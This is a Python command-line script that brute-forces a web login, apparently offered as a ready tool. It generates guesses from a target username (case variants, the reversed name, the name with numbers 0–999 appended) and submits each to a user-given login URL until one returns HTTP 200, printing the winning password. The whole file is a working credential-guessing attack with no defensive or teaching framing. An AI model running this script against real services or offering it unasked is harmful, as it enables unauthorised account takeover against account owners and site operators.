import requests
import argparse

def generate_wordlist(username):
    variations = [
        username,
        username.lower(),
        username.upper(),
        username.capitalize(),
        username[::-1], 
    ]
    
    for num in range(1000):
        variations.append(f"{username}{num}")
        variations.append(f"{username.capitalize()}{num}") 
    
    return variations

def brute_force_login(username, url, wordlist, headers):
    for password in wordlist:
        payload = {
            "username": username,
            "password": password
        }
        
        try:
            response = requests.get(url, json=payload, headers=headers)  
            if response.status_code == 200:
                print(f"Login successful with password: {password}")
                return True 
            else:
                # print(f"Login failed with password: {password}")
                print(f"\rLogin failed with password: {password}", end='')
        except requests.exceptions.ConnectionError:
            print("Failed to connect to the server.")
            return False
    return False

def main():
    parser = argparse.ArgumentParser(description="Brute-force login attempt with generated wordlist.")
    parser.add_argument("-url", type=str, required=True, help="URL of the login endpoint")
    parser.add_argument("-username", type=str, required=True, help="Username for the login")
    
    args = parser.parse_args()

    print(f"Generating wordlist for username '{args.username}'...")
    wordlist = generate_wordlist(args.username)
    
    url = args.url
    headers = {
        "Content-Type": "application/json"
    }

    print(f"Starting brute-force login attempts on {url}...")
    success = brute_force_login(args.username, url, wordlist, headers)
    
    if not success:
        print("All attempts failed.")

if __name__ == "__main__":
    main()
